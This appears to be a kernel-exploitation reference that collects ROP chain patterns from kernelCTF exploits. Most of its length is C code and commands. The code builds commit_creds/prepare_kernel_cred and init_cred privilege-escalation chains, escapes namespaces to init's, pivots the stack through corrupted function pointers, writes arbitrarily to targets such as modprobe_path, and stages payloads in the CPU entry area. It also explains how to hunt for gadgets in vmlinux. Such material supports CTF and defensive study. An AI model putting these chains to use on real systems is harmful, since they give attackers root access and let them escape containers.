# ROP Chain Patterns for Kernel Exploitation

Common ROP chain patterns extracted from 96 kernelCTF exploits.

## Pattern 1: Standard commit_creds Chain

The most common pattern (~60% of exploits):

```c
void build_rop_chain(unsigned long *rop, unsigned long kbase) {
    int i = 0;

    /* Offsets - MUST be updated per kernel version */
    unsigned long pop_rdi_ret          = kbase + 0xXXXXXX;
    unsigned long pop_rsi_ret          = kbase + 0xXXXXXX;
    unsigned long pop_rcx_ret          = kbase + 0xXXXXXX;
    unsigned long mov_rdi_rax_jmp_rcx  = kbase + 0xXXXXXX;
    unsigned long prepare_kernel_cred  = kbase + 0xXXXXXX;
    unsigned long commit_creds         = kbase + 0xXXXXXX;
    unsigned long find_task_by_vpid    = kbase + 0xXXXXXX;
    unsigned long switch_task_ns       = kbase + 0xXXXXXX;
    unsigned long init_nsproxy         = kbase + 0xXXXXXX;
    unsigned long kpti_trampoline      = kbase + 0xXXXXXX;
    /* kpti_trampoline = swapgs_restore_regs_and_return_to_usermode
     * Often need to skip initial pops: +0x22 or similar offset */

    /* Stage 1: Get root credentials */
    rop[i++] = pop_rdi_ret;
    rop[i++] = 0;                      /* prepare_kernel_cred(NULL) */
    rop[i++] = prepare_kernel_cred;    /* rax = new root cred */
    rop[i++] = pop_rcx_ret;
    rop[i++] = commit_creds;           /* rcx = commit_creds */
    rop[i++] = mov_rdi_rax_jmp_rcx;   /* commit_creds(new_cred) */

    /* Stage 2: Escape namespaces (skip if not in namespace) */
    rop[i++] = pop_rdi_ret;
    rop[i++] = 1;                      /* PID 1 = init */
    rop[i++] = find_task_by_vpid;      /* rax = init task_struct */
    rop[i++] = pop_rcx_ret;
    rop[i++] = pop_rsi_ret;            /* rcx points to pop_rsi;ret */
    rop[i++] = mov_rdi_rax_jmp_rcx;   /* rdi = init_task, jump to pop_rsi */
    rop[i++] = init_nsproxy;           /* rsi = &init_nsproxy */
    rop[i++] = switch_task_ns;         /* switch_task_namespaces(init, init_nsproxy) */

    /* Stage 3: Return to userspace */
    rop[i++] = kpti_trampoline;        /* swapgs + iret */
    rop[i++] = 0;                      /* padding for pop regs */
    rop[i++] = 0;                      /* padding */
    rop[i++] = (unsigned long)win;     /* user RIP */
    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = user_sp;
    rop[i++] = user_ss;
}
```

## Pattern 2: init_cred Direct Chain (Simpler)

When `init_cred` symbol is available:

```c
void build_rop_init_cred(unsigned long *rop, unsigned long kbase) {
    int i = 0;

    unsigned long pop_rdi_ret     = kbase + 0xXXXXXX;
    unsigned long commit_creds    = kbase + 0xXXXXXX;
    unsigned long init_cred       = kbase + 0xXXXXXX;
    unsigned long kpti_trampoline = kbase + 0xXXXXXX;

    /* commit_creds(&init_cred) - shorter chain, no prepare_kernel_cred */
    rop[i++] = pop_rdi_ret;
    rop[i++] = init_cred;
    rop[i++] = commit_creds;

    /* Return to userspace */
    rop[i++] = kpti_trampoline;
    rop[i++] = 0;
    rop[i++] = 0;
    rop[i++] = (unsigned long)win;
    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = user_sp;
    rop[i++] = user_ss;
}
```

## Pattern 3: Stack Pivot + ROP

When you control a function pointer (e.g., ops->eval, qdisc->enqueue):

```c
/*
 * Scenario: You've corrupted a function pointer that will be called
 * with a controlled first argument (rdi) pointing to your data.
 *
 * Strategy:
 * 1. Place ROP chain in the controlled data buffer
 * 2. Set function pointer to a stack pivot gadget
 * 3. Trigger the function call
 * 4. Stack pivot moves RSP to your ROP chain
 * 5. ROP chain executes
 */

/* Option A: push reg; pop rsp; pop rbp; ret */
/* If rdi points to your controlled data: */
unsigned long push_rdi_pop_rsp = kbase + 0xXXXXXX;  /* push rdi; ... pop rsp ... ret */

/* Option B: Using leave;ret when rbp is controllable */
unsigned long leave_ret = kbase + 0xXXXXXX;

/* Option C: xchg rax, rsp; ret */
unsigned long xchg_rax_rsp = kbase + 0xXXXXXX;

/* Place ROP chain at the address rdi/rbp/rax points to */
unsigned long *rop = (unsigned long *)controlled_buffer;
build_rop_chain(rop, kbase);

/* Set the function pointer to the pivot gadget */
fake_ops->eval = push_rdi_pop_rsp;
```

## Pattern 4: Arbitrary Write via mov Gadgets

When you control rax and need to write to an address:

```c
/*
 * Used for data-only attacks (core_pattern, modprobe_path, cred)
 * without full ROP chain execution.
 */

/* Gadget: mov [rdi], rsi; ret */
/* or: mov [rax], rcx; ret */
/* or: mov qword ptr [rdx], rax; ret */

/* Chain multiple writes: */
rop[i++] = pop_rdi_ret;
rop[i++] = target_address;          /* Where to write */
rop[i++] = pop_rsi_ret;
rop[i++] = value_to_write;          /* What to write */
rop[i++] = mov_rdi_rsi_ret;         /* *target = value */
```

## Pattern 5: CPU Entry Area ROP (No KASLR for Payload)

Write ROP chain to CPU entry area (fixed address):

```c
/*
 * CPU entry area is at a deterministic address (not randomized).
 * Write ROP chain there, then pivot stack to it.
 *
 * 1. Use arbitrary write to place ROP chain at CPU entry area
 * 2. Trigger function pointer call with stack pivot to that address
 * 3. ROP executes from deterministic location
 */

#define CPU_ENTRY_AREA  0xfffffe0000001000UL
#define PER_CPU_SIZE    0x3b000UL
#define STACK_OFFSET    0x1f58UL

unsigned long rop_addr = CPU_ENTRY_AREA + target_cpu * PER_CPU_SIZE + STACK_OFFSET;

/* Write ROP chain to rop_addr using arbitrary write primitive */
for (int j = 0; j < rop_len; j++) {
    arb_write_8bytes(rop_addr + j * 8, rop[j]);
}

/* Trigger with stack pivot to rop_addr */
```

## Finding Gadgets

### Method 1: ROPgadget on vmlinux
```bash
ROPgadget --binary vmlinux --ropchain
ROPgadget --binary vmlinux | grep "pop rdi"
ROPgadget --binary vmlinux | grep "mov rdi, rax"
ROPgadget --binary vmlinux | grep "push .* ; pop rsp"
```

### Method 2: From /proc/kallsyms + objdump
```bash
# Get function addresses
cat /proc/kallsyms | grep -E "(prepare_kernel_cred|commit_creds|swapgs_restore)"

# Disassemble around known functions for gadgets
objdump -d vmlinux | grep -A5 "pop.*rdi"
```

### Essential Gadgets Checklist
- [ ] `pop rdi ; ret`
- [ ] `pop rsi ; ret`
- [ ] `pop rcx ; ret` (or `pop rdx ; ret`)
- [ ] `mov rdi, rax ; jmp rcx` (or `call` variant)
- [ ] Stack pivot gadget (push/xchg/leave variant)
- [ ] `ret` (for alignment)
- [ ] `swapgs_restore_regs_and_return_to_usermode` (kpti trampoline)
